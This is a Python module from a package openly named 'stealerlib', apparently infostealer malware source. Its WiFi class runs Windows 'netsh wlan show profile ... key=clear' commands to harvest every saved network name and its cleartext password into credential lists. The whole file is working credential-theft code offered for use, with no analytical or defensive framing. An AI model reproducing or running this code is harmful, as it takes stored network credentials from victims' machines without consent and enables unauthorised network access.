#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
    @author:  codeuk
    @package: stealerlib/wifi/__init__.py
"""

import subprocess

from stealerlib.exceptions import catch


class WiFi:
    """This class provides methods for extracting and parsing information from connected WiFi stations

    Attributes:
        ssids           List of Parsed WiFi SSID's
        passwords       List of Parsed WiFi Passwords
        credentials     A list of tuples containing the WiFi's SSID and password (if parsed)
    """

    def __init__(self):
        self.ssids = []
        self.passwords = []
        self.credentials = []

    @catch
    @staticmethod
    def get_wifi_profiles() -> list[str]:
        """Retrieves all wifi profiles from the system -- Not implemented into get_passwords yet

        Parameters:
            None

        Returns:
            list[str]: A list of all wifi profile names
        """

        command_arguments = ['netsh', 'wlan', 'show', 'profiles']
        command_data = subprocess.check_output(command_arguments)
        command_data = command_data.decode('utf-8', errors="backslashreplace").split('\n')

        profiles = [
            p.split(":")[1][1:-1] for p in command_data if "All User Profile" in p
        ]

        return profiles

    @catch
    @staticmethod
    def get_profile_info(profile: str) -> list[str]:
        """Retrieves wifi profile information for a given profile name -- Not implemented into get_passwords yet

        Parameters:
            profile (str): The name of the wifi profile

        Returns:
            list[str]: A list of the profile information
        """

        command_arguments = ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']
        command_data = subprocess.check_output(command_arguments)
        command_data = command_data.decode('utf-8', errors="backslashreplace").split('\n')

        info = [
            p.split(":")[1][1:-1] for p in command_data if "Key Content" in p
        ]

        return info

    @catch
    def get_passwords(self):
        """Gets all wifi profiles and their passwords from the system

        Parameters:
            self (object): The object passed to the method

        Returns:
            None

        Example:
            network = WiFi()
            network.get_passwords()
        """

        command_arguments = ['netsh', 'wlan', 'show', 'profiles']
        command_data = subprocess.check_output(command_arguments)
        command_data = command_data.decode('utf-8', errors="backslashreplace").split('\n')

        profiles = [
            p.split(":")[1][1:-1] for p in command_data if "All User Profile" in p
        ]

        for profile in profiles:
            try:
                command_arguments = ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']
                command_data = subprocess.check_output(command_arguments)
                command_data = command_data.decode('utf-8', errors="backslashreplace").split('\n')

                profile_info = [
                    p.split(":")[1][1:-1] for p in command_data if "Key Content" in p
                ]

                try:
                    wifi_cred = profile_info[0]
                except IndexError:
                    wifi_cred = "No Password"
            except subprocess.CalledProcessError:
                wifi_cred = "Encoding Error"

            self.ssids.append(profile)
            self.passwords.append(wifi_cred)
            self.credentials.append((profile, wifi_cred))

